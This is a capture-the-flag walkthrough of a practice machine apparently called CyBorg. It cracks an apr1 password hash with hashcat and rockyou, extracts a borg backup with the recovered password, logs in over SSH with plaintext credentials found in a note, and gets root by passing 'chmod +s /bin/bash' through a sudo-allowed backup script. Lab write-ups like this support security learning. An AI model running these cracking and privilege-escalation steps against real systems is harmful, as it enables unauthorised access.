Firstly there was a /etc  where i found passwd and squid.conf
in the password i had a hash which was "$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."
Saved it in a hash.txt file and ran hashcat


hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt

Boom we have a password that is 'squidward'

In that passwd file it had
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

that means the username is music_archive and password is squidward


Than i found an /admin page...
I went there and after a bit of poking arround i got a download section with a archive.tar file ??
I did wget it into the directory

extract it with 
tar -xvf archive.tar

now i got whole backup of the borg 

install borg by sudo apt install borgbackup

then do borg extract /home/kali/THM/CyBorg/home/field/dev/final_archive::music_archive   >> here music_archive is the user we found and also its passwd protected so that hash we cracked is its password

and now we got a home  directory

In /home/alex/Documents directory i found a note.txt which has

user and passwords
alex:S3cretP@s3


SSH into the box and boom now we have user.txt


and on running sudo -l i found

Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

in the backup.sh file i saw that it was taking a cmd on -c and that script was running it as root and to check it i did 

sudo /etc/mp3backups/backup.sh -c id

and got output as 
Backup finished
uid=0(root) gid=0(root) groups=0(root)

so for privilledge escallation 


sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"



and booom we are Root
